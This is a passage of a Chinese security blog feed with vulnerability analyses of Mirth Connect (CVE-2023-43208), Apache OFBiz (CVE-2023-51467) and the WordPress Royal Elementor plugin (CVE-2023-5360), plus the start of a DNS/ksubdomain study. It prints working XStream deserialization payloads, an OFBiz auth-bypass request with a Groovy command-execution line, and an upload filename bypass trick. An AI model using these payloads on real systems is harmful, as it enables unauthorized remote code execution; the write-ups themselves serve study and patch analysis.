src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/b341cf92-2b0d-4909-baa0-5795c58ce780.png?imageSlim" alt="image"></p><p>这个 readFrom是 JAX-RS MessageBodyReader 接口中定义的标准方法，用于读取请求实体并将其映射到 Java 对象。</p><p>在配合上面的注解：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/c573f7e8-3e8d-4311-a758-6b51200a6205.png?imageSlim" alt="image"></p><p>这个类型的都会给这个 readFrom 去转换，那么搜一下 MediaType.APPLICATION_XML：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/25fca358-b2dc-4bb4-beb0-cb7e5d68c1e6.png?imageSlim" alt="image"></p><p>有很多，不过大部分好像是需要登录的：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/c0b6568d-14ab-4543-bef7-b5793f205dd2.png?imageSlim" alt="image"></p><p>找了下是个 swagger：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/9028a392-b82e-40de-9061-4f35885fda98.png?imageSlim" alt="image"></p><p>简单跑了下未授权的接口，找了个 XStream 的 payload 试了下：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/7c57b5e4-f351-4202-9f2c-73414b1c5513.png?imageSlim" alt="image"></p><p>而上面使用的 payload 只能影响 java 8 的版本，原因是 Java 9 引入了 “模块” 的概念来更好地封装 Java 库，从 Java 17 开始，JRE 明确禁止访问模块化库的私有成员，这也就导致了上面的 payload 在其他的 java 版本中利用失败。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/Screenshot-2024-01-09-at-12.22.25-PM.png.webp?imageSlim"></p><p>horizon3.ai 找到了下面的代替类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">apache.commons.lang3 org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler<br></code></pre></td></tr></table></figure><p>上面可以看到其采用的是黑名单的方式去修复的，黑名单也来自于 XStream 官网，而 XStream 说明其并不考虑第三方库中的类，这也就导致了可以使用 <code>org.apache.commons.collections4.functors.InvokerTransformer</code> 来进行命令执行，绕过黑名单的限制。</p><p>原版 payload 如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">sorted-set</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>foo<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">contact</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;dynamic-proxy&#x27;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">interface</span>&gt;</span>java.lang.Comparable<span class="hljs-tag">&lt;/<span class="hljs-name">interface</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">handler</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;java.beans.EventHandler&#x27;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">target</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;java.lang.ProcessBuilder&#x27;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span>&gt;</span>start<span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">handler</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">contact</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">sorted-set</span>&gt;</span><br></code></pre></td></tr></table></figure><p>bypass 的：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">sorted-set</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>abcd<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dynamic-proxy</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">interface</span>&gt;</span>java.lang.Comparable<span class="hljs-tag">&lt;/<span class="hljs-name">interface</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">handler</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.apache.commons.lang3.event.EventUtils$EventBindingInvocationHandler&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">target</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;org.apache.commons.collections4.functors.ChainedTransformer&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">iTransformers</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">org.apache.commons.collections4.functors.ConstantTransformer</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">iConstant</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java-class&quot;</span>&gt;</span>java.lang.Runtime<span class="hljs-tag">&lt;/<span class="hljs-name">iConstant</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">org.apache.commons.collections4.functors.ConstantTransformer</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">org.apache.commons.collections4.functors.InvokerTransformer</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">iMethodName</span>&gt;</span>getMethod<span class="hljs-tag">&lt;/<span class="hljs-name">iMethodName</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">iParamTypes</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">java-class</span>&gt;</span>java.lang.String<span class="hljs-tag">&lt;/<span class="hljs-name">java-class</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">java-class</span>&gt;</span>[Ljava.lang.Class;<span class="hljs-tag">&lt;/<span class="hljs-name">java-class</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">iParamTypes</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">iArgs</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>getRuntime<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">java-class-array</span>/&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">iArgs</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">org.apache.commons.collections4.functors.InvokerTransformer</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">org.apache.commons.collections4.functors.InvokerTransformer</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">iMethodName</span>&gt;</span>invoke<span class="hljs-tag">&lt;/<span class="hljs-name">iMethodName</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">iParamTypes</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">java-class</span>&gt;</span>java.lang.Object<span class="hljs-tag">&lt;/<span class="hljs-name">java-class</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">java-class</span>&gt;</span>[Ljava.lang.Object;<span class="hljs-tag">&lt;/<span class="hljs-name">java-class</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">iParamTypes</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">iArgs</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">null</span>/&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">object-array</span>/&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">iArgs</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">org.apache.commons.collections4.functors.InvokerTransformer</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">org.apache.commons.collections4.functors.InvokerTransformer</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">iMethodName</span>&gt;</span>exec<span class="hljs-tag">&lt;/<span class="hljs-name">iMethodName</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">iParamTypes</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">java-class</span>&gt;</span>java.lang.String<span class="hljs-tag">&lt;/<span class="hljs-name">java-class</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">iParamTypes</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">iArgs</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>&lt;<span class="hljs-tag">&lt;<span class="hljs-name">COMMAND</span>&gt;</span>&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">iArgs</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">org.apache.commons.collections4.functors.InvokerTransformer</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">iTransformers</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">methodName</span>&gt;</span>transform<span class="hljs-tag">&lt;/<span class="hljs-name">methodName</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">eventTypes</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>compareTo<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">eventTypes</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">handler</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dynamic-proxy</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">sorted-set</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.horizon3.ai/writeup-for-cve-2023-43208-nextgen-mirth-connect-pre-auth-rce/">CVE-2023-43208 撰写文章：NextGen Mirth Connect 预身份验证 RCE – Horizon3.ai</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2023-51467 Apache OFBiz 未授权远程代码执行漏洞</title>
      <link href="/2023/11/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2023-51467/"/>
      <url>/2023/11/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2023-51467/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞名称：CVE-2023-51467 Apache OFBiz 未授权远程代码执行漏洞</p><p>漏洞介绍：在 ofbiz 18.12.10 版本官方仍未修复权限绕过漏洞，导致攻击者能够利用此漏洞绕过权限并且配合后台代码执行来获取远程服务器权限。</p><p>影响应用：Apache Ofbiz &lt;18.12.11</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>下载 18.12.10 和 18.12.11 进行对比，看到 LoginWorker.java 存在变更：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/6d2c876c-69c7-4bad-a9c3-78847f672bac.png?imageSlim" alt="image"></p><p>checkLogin 函数的变更就是用 UtilValidate.isEmpty替换掉 =&#x3D; null，看了下UtilValidate.isEmpty，没有什么危险的地方，就还是判断是否空值。</p><p>该文件还有 login函数存在变更：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">requirePasswordChange ? <span class="hljs-string">&quot;requirePasswordChange&quot;</span> : <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;error&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/dfb3d4c7-e09c-4e5b-b3df-32029f875262.png?imageSlim" alt="image"></p><p>从两个值变成了一个固定的 error，从上面的代码可以看到，这个值是用户可控的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">boolean</span> <span class="hljs-variable">requirePasswordChange</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Y&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;requirePasswordChange&quot;</span>));<br></code></pre></td></tr></table></figure><p>返回去看 checkLogin 函数，检测登陆的，可以看到会返回两种，success肯定就表示登陆成功或已登陆了。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/59b0a10c-40ff-4fe7-bfbe-1ba0b9f9843d.png?imageSlim" alt="image"></p><p>只要这个 if 条件不满足，就可以然后 success：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (username == <span class="hljs-literal">null</span> || (password == <span class="hljs-literal">null</span> &amp;&amp; token == <span class="hljs-literal">null</span>) || <span class="hljs-string">&quot;error&quot;</span>.equals(login(request, response))) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>或的条件，并且 username、password、token 都是可控的，根据上面的 login 函数也可以不返回 error ：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/b7e52e49-cf67-4dfa-b054-63e3f61a0c7e.png?imageSlim" alt="image"></p><p>构造如下请求即可实现绕过：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">https://localhost:8443/webtools/control/ProgramExport?USERNAME=x&amp;PASSWORD=y&amp;requirePasswordChange=Y<br></code></pre></td></tr></table></figure><p>其 RCE 是后台提供的一个可以执行自定义 groovy 脚本的功能，做了一些简单的黑名单，不过 execute() 这个命令执行的没有被禁止，有些简单的命令被过滤可以使用 reverse() 进行字符串反转绕过，p 牛也给出了有回显的 payload ，groovy 的异常报错会出现在响应中，那么就将命令执行的结果保存导异常中即可进行回显：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">throw <span class="hljs-built_in">new</span> <span class="hljs-keyword">Exception</span>(&quot;id&quot;.<span class="hljs-keyword">execute</span>().text);<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2023-5360 WordPress Royal Elementor 任意文件上传</title>
      <link href="/2023/11/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2023-5360/"/>
      <url>/2023/11/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2023-5360/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞名称：WordPress Royal Elementor 任意文件上传</p><p>漏洞介绍：WordPress Royal Elementor 插件 1.3.78 及之前的版本允许未经身份验证的攻击者在易受攻击的网站上执行任意文件上传</p><p>影响应用：”WP Royal” 的 Royal Elementor 插件和模板是一个网站构建工具包，无需编码知识即可快速创建 Web 元素。据 WordPress.org 称，它的活跃安装量超过 200,000 次。</p><p>利用前提：版本 &lt; 1.3.79 且该网站使用了这个插件提供的主题（ 文件上传需要使用到 wpr_addons_nonce 参数 &#x3D;&gt; JS 中的 WprConfig 变量 ）</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://downloads.wordpress.org/plugin/royal-elementor-addons.1.3.78.zip">https://downloads.wordpress.org/plugin/royal-elementor-addons.1.3.78.zip</a></p><p>安装的时候还得安装个 Elementor 插件：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/689a5a2d-f1ca-405e-842f-4b4505d06b16.png?imageSlim" alt="image"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>文件上传在 wp-content\plugins\royal-elementor-addons\classes\modules\forms\wpr-file-upload.php 的 handle_file_upload() 函数中：</p><p>开始是先验证了个随机数：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/7fb21571-d33a-41d5-b573-b3058532f0d1.png?imageSlim" alt="image"></p><p>这个东西是可能会输出到页面的，搜索一下 wpr-addons-js，这里是给一个叫 WprConfig JS 对象：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/61ddf544-047e-41fe-b23b-f24da1569f65.png?imageSlim" alt="image"></p><p>直接搜索一下就能找到：</p><blockquote><p>PS ：必须使用该插件的模板才会显示这个 WprConfig，不使用的话就没有</p></blockquote><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/f426274a-f860-4b41-aae2-bf628a3ab459.png?imageSlim" alt="image"></p><p>接着向下，使用 file_validity 函数做验证，然后通过 wp_unique_filename 生成文件名上传：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/3ae377f1-dcdb-45ef-a253-14f7896698ae.png?imageSlim" alt="image"></p><p>它的白名单不是固定的，而是说可以从 POST 获取一个白名单，不过最后还有一个黑名单检验：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/7276e20f-76bf-4696-af13-d5096477b7ae.png?imageSlim" alt="image"></p><p>黑名单列表：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/b7ea7917-1305-4d8e-874d-7e8b532e90b6.png?imageSlim" alt="image"></p><p>白名单可控，黑名单就不行了。黑名单不是很全，就比如 phar 没有，不过这个后缀还需要服务器能解析，所以利用点不在这里，而是下面通过wp_unique_filename 生成文件名的时候：</p><p><a href="https://developer.wordpress.org/reference/functions/wp_unique_filename/">https://developer.wordpress.org/reference/functions/wp_unique_filename&#x2F;</a></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/49dda8e4-0ed3-4331-b5fb-71ae6ba9b3a1.png?imageSlim" alt="image"></p><p>它的内部会调用 sanitize_file_name 函数处理文件名：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/56d12866-8aed-496c-8cbc-91ef4107bd51.png?imageSlim" alt="image"></p><p><a href="https://developer.wordpress.org/reference/functions/sanitize_file_name/">https://developer.wordpress.org/reference/functions/sanitize_file_name&#x2F;</a></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/3b167172-e7e1-4570-b85c-01c5064f5e20.png?imageSlim" alt="image"></p><p>它会去掉文件名中这样的字符串：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/2ec4175b-f12c-405e-b649-1801c0dda5fb.png?imageSlim" alt="image"></p><p>那么搞个像 ph?p、ph[p 的白名单上传后就是个 php 文件了。EXP 还没有公开，所以刚开始也没发现上传这个地方，不过看到了这个：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/6e3b582e-a037-4b51-ad19-3971a6ac3e89.png?imageSlim" alt="image"></p><p>这里任意文件上传就搞完了，接着就找找哪里触发：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/6c86fa2d-f595-4981-8e5b-7817cc006bd0.png?imageSlim" alt="image"></p><p>被加入到了 wp_ajax 里面，不跟了，直接向 &#x2F;wp-admin&#x2F;admin-ajax.php 发送相关数据包就行，找了下表单就是这些东西：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/af14f8cc-3199-46e7-9831-aa25ea12b392.png?imageSlim" alt="image"></p><p>搞搞直接发包试一下：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/997e041b-2662-497f-a7ef-1629b10757a1.png?imageSlim" alt="image"></p><p>也是成功上传了：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/47f46f24-7592-4113-98e1-8a035b1c7043.png?imageSlim" alt="image"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a href="https://downloads.wordpress.org/plugin/royal-elementor-addons.1.3.79.zip">https://downloads.wordpress.org/plugin/royal-elementor-addons.1.3.79.zip</a></p><p>这里修复是使用 wp_check_filetype() 它的作用是用来检测文件名的后缀和指定的 MIME 是否匹配，这里没有指定所以默认的是 get_allowed_mime_types() 中的 wp_get_mime_types 指定的，我们上传的 php 它默认的是没有这个 MIME 的，导致这里直接为 false ：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/57e7ae7d-c009-45f5-8525-25b699f3c2df.png?imageSlim" alt="image"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/461c525a-c370-4909-a95f-b62e4adfebbe.png?imageSlim" alt="image"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/2d38d5b5-d021-4ea0-a343-25399700e209.png?imageSlim" alt="image"></p><p><a href="https://developer.wordpress.org/reference/functions/wp_get_mime_types/">https://developer.wordpress.org/reference/functions/wp_get_mime_types&#x2F;</a></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/bc4da337-a140-43e0-a93e-bb9b8a67133e.png?imageSlim" alt="image"></p><h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><p>当使用 wordpress 的 <code>wp_unique_filename</code> 方法去生成文件名的时候会导致如 ph?p 这种类型的后缀时会导致其生成 php 的文件名。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ksubdomain 源码学习</title>
      <link href="/2023/09/16/%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/ksubdomain/"/>
      <url>/2023/09/16/%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/ksubdomain/</url>
      
        <content type="html"><![CDATA[<h2 id="项目介绍"><a href="#项目介绍" class="headerlink" title="项目介绍"></a>项目介绍</h2><p><strong>KSubdomain 是一款基于无状态技术的子域名爆破工具，带来前所未有的扫描速度和极低的内存占用。</strong> 告别传统工具的效率瓶颈，体验闪电般的 DNS 查询，同时拥有可靠的状态表重发机制，确保结果的完整性。 KSubdomain 支持 Windows、Linux 和 macOS，是进行大规模DNS资产探测的理想选择。</p><p>项目地址：<a href="https://github.com/boy-hack/ksubdomain">https://github.com/boy-hack/ksubdomain</a></p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="无状态"><a href="#无状态" class="headerlink" title="无状态"></a>无状态</h3><p>无状态连接是指无需关系 TCP、UDP 协议状态，不占用系统协议栈资源，忘记 SYN、ACK、FIN、TIMEWIT，不进行会话组包。在实现上也有可能把必要的信息存放在数据包本身。如 masscan、zmp 都使用了这种无状态技术。</p><h3 id="pcap"><a href="#pcap" class="headerlink" title="pcap"></a>pcap</h3><p>Pcap是 <a href="https://zh.wikipedia.org/wiki/%E7%94%B5%E5%AD%90%E8%AE%A1%E7%AE%97%E6%9C%BA">计算机</a> <a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86">网络管理</a>领域中一个用于 <a href="https://zh.wikipedia.org/wiki/%E6%95%B8%E6%93%9A%E5%8C%85%E5%88%86%E6%9E%90%E5%99%A8">捕获网络流量</a>的 <a href="https://zh.wikipedia.org/wiki/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8E%A5%E5%8F%A3">应用程序接口</a>（API）。其名称来源于“抓包”（英语：packet capture）（并非它的正确名称）。Pcap是用 <a href="https://zh.wikipedia.org/wiki/C%E8%AF%AD%E8%A8%80">C语言</a>编写的。在 <a href="https://zh.wikipedia.org/wiki/%E7%B1%BBUnix%E7%B3%BB%E7%BB%9F">类Unix系统</a>中libpcap <a href="https://zh.wikipedia.org/wiki/%E5%87%BD%E5%BC%8F%E5%BA%AB">库</a>实现了pcap；在 <a href="https://zh.wikipedia.org/wiki/Microsoft_Windows">Microsoft Windows</a>上，则由Npcap库移植了libpcap， <a href="https://zh.wikipedia.org/wiki/Windows_7">Windows 7</a>中可以使用WinPcap库的移植，但现已不再维护。</p><p>监控软件可以使用 pcap 来捕获在 <a href="https://zh.wikipedia.org/wiki/%E9%9B%BB%E8%85%A6%E7%B6%B2%E8%B7%AF">计算机网络</a>上传输的 <a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E8%B7%AF%E5%B0%81%E5%8C%85">网络数据包</a>。</p><h3 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h3><p>DNS 域名解析协议，它的作用就是将域名解析为 IP 地址。</p><h4 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h4><p>DNS 协议可以使用 UDP 或者 TCP 进行传输，使用的端口号都为 53，但大多数情况下 DNS 都使用 UDP 进行传输。</p><p>DNS 报文包括请求报文和应答报文，它们格式是相同的，如下所示：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/202309151713181.png?imageSlim" alt="img"></p><h4 id="报文头部"><a href="#报文头部" class="headerlink" title="报文头部"></a>报文头部</h4><ul><li>标识 <code>(identifier)</code>：一个 16 位的 ID ，在应答中原样返回，以此匹配请求和应答；</li><li>标志 <code>(flags)</code>：描述 DNS 报文的类别和工作特性，共 16 位；</li><li>问题记录数 <code>(question count)</code>：一个 16 位整数，表示问题节中的记录个数；</li><li>答案记录数 <code>(answer count)</code>：一个 16 位整数，表示答案节中的记录个数；</li><li>授权信息记录数 <code>(authority record count)</code> ：一个 16 位整数，表示授权信息节中的记录个数；</li><li>附加信息记录数 <code>(additional record count)</code> ：一个 16 位整数，表示附加信息节中的记录个数；</li></ul><p>标志：</p><ul><li><code>QR</code>：用来区别请求和应答，0 表示请求报文，1 表示应答报文，占 1 位</li><li>操作码 <code>(Opcode)</code>：用来定义操作类型，占 4 位<ul><li>0 代表标准查询（ 正向解析 ）</li><li>1 代表反向查询（ 反向解析 ）</li><li>2 代表服务器状态请求</li></ul></li><li><code>AA</code> ： 权威回答<code>(authoritative answer)</code>，意味着当前查询结果是由域名的权威服务器给出的；</li><li><code>TC</code> ： 截短<code>(truncated)</code>，使用 UDP 时，如果应答超过 512 字节，只返回前 512 个字节；</li><li><code>RD</code> ：期望递归 <code>(recursion desired)</code>，在请求中设置，并在应答中返回；<ul><li>该位为 1 时，服务器必须处理这个请求：如果服务器没有授权回答，它必须替客户端请求其他 DNS 服务器，这也是所谓的 递归查询 ；</li><li>该位为 0 时，如果服务器没有授权回答，它就返回一个能够处理该查询的服务器列表给客户端，由客户端自己进行 迭代查询 ；</li></ul></li><li><code>RA</code> ：可递归 <code>(recursion available)</code>，如果服务器支持递归查询，就会在应答中设置该位，以告知客户端</li><li>保留：这 3 位目前未用，留作未来扩展；</li><li>响应码 <code>(response code)</code>：占 4 位，表示请求结果，常见的值包括：<ul><li>0 表示没有差错；</li><li>3 表示名字差错，该差错由权威服务器返回，表示待查询的域名不存在；</li></ul></li></ul><h4 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h4><p>DNS 报文数据部分由 4 个变长部分组成，请求报文中常常只有问题部分有内容，而其他 3 个部分的资源记录数为 0 